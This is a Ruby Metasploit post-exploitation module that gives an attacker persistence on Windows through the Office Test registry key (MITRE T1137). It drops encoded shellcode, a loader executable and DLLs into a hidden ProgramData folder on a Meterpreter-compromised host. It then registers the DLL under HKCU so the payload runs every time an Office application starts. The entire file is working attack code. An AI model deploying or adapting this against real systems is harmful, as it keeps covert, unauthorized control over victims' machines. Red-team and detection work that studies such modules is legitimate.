##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local
  include Msf::Post::Windows::Priv
  include Msf::Post::Common
  include Msf::Post::File
  include Msf::Post::Windows::Priv

  DEFAULT_VAL_NAME = '' # This maps to "(Default)"
  def initialize(info = {})
    super(update_info(info,
                      'Name'          => 'Office Application Startup (T1137) Windows - VIPER',
                      'Description'   => %q{
                          Persistence:
                          A Registry location was found that when a DLL reference was placed within it the corresponding DLL pointed to by the binary path would be executed every time an Office application is started.},
                      'License'       => MSF_LICENSE,
                      'Author'        => ['Praetorian'],
                      'References'    => [['URL', 'https://attack.mitre.org/techniques/T1137/']],
                      'Platform'      => ['win'],
                      'Targets'       => [['Windows', {}]],
                      'SessionTypes'  => ['meterpreter'],
                      'DefaultTarget' => 0,
          ))
    register_options(
            [
                    OptString.new('REMOTE_EXE_PATH', [false, 'The remote victim exe path to run. Use temp directory as default. ']),
            ])
  end


  def exploit

    unless session.type == "meterpreter"
      pub_json_result(false,
                      'Unsupport shell type',
                      nil,
                      self.uuid)
      return
    end


    if datastore['PAYLOAD'].include?(ARCH_X64)
      data_dll_file    = "MDSDLL_x64.dll"
      data_exe_file    = "loader_x64.exe"
      runtime_dll_file = "vcruntime140_x64.dll"
    else
      data_dll_file    = "MDSDLL_x86.dll"
      data_exe_file    = "loader_x86.exe"
      runtime_dll_file = "vcruntime140_x64.dll"
    end

    vprint_status("Running module against #{sysinfo['Computer']}")

    @storedir = create_store_rand_dir()
    if @storedir == nil
      pub_json_result(false,
                      'Create rand dir failed',
                      nil,
                      self.uuid)
      return
    end
    @runtime_dll    = "vcruntime140.dll"
    @dll_file       = "OfficeTest.dll"
    @exe_file       = "OfficeTest.exe"
    @shellcode_file = "OfficeTest.ini"

    buf            = create_payload
    shellcode_path = @storedir + "\\" + @shellcode_file
    write_file_to_target(shellcode_path, buf)


    @exe_path = @storedir + "\\" + @exe_file
    bin       = File.read(File.join(Msf::Config.data_directory, 'exploits', 'persistence_dll', data_exe_file))
    write_file_to_target(@exe_path, bin)


    @victim_path = @storedir + "\\" + @dll_file
    bin          = File.read(File.join(Msf::Config.data_directory, 'exploits', 'persistence_dll', data_dll_file))
    write_file_to_target(@victim_path, bin)

    @runtime_path = @storedir + "\\" + @runtime_dll
    bin           = File.read(File.join(Msf::Config.data_directory, 'exploits', 'persistence_dll', runtime_dll_file))
    write_file_to_target(@runtime_path, bin)
    
    unless session.fs.file.exist? shellcode_path and session.fs.file.exist? @victim_path and session.fs.file.exist? @exe_path and session.fs.file.exist? @runtime_path
      pub_json_result(false,
                      'write loader to storedir failed,maybe permission or AV',
                      nil,
                      self.uuid)
      return
    end


    reg_base_key = "HKCU\\Software\\Microsoft\\Office test\\Special\\Perf"
    reg_base_val = DEFAULT_VAL_NAME

    # add the logon script

    unless registry_key_exist? reg_base_key
      unless registry_createkey(reg_base_key)
        pub_json_result(false,
                        'crete registry failed',
                        nil,
                        self.uuid)
      end
    end


    if registry_setvaldata(reg_base_key, reg_base_val, @victim_path, "REG_SZ")
      vprint_good("Success! To test persistence, log out and then log in.")
      pub_json_result(true,
                      nil,
                      @victim_path,
                      self.uuid)
      return
    else
      pub_json_result(false,
                      'write registry failed',
                      nil,
                      self.uuid)
    end

  end


  def create_payload
    p = payload.encoded
    Msf::Simple::Buffer.transform(p, 'hex', 'buf')
  end

  def create_store_rand_dir()
    dirname     = Rex::Text.rand_text_alpha(10)
    fulldirname = session.sys.config.getenv('ProgramData') + "\\" + dirname
    session.fs.dir.mkdir(fulldirname)
    if session.fs.file.exist? fulldirname
      vprint_good("create storedir : #{fulldirname}")
      return fulldirname
    else
      vprint_error("create storedir failed : #{fulldirname}")
      return nil
    end
  end

  def write_file_to_target(filepath, filedata)
    fd = session.fs.file.new(filepath, "wb")
    fd.write(filedata)
    fd.close
  end
end
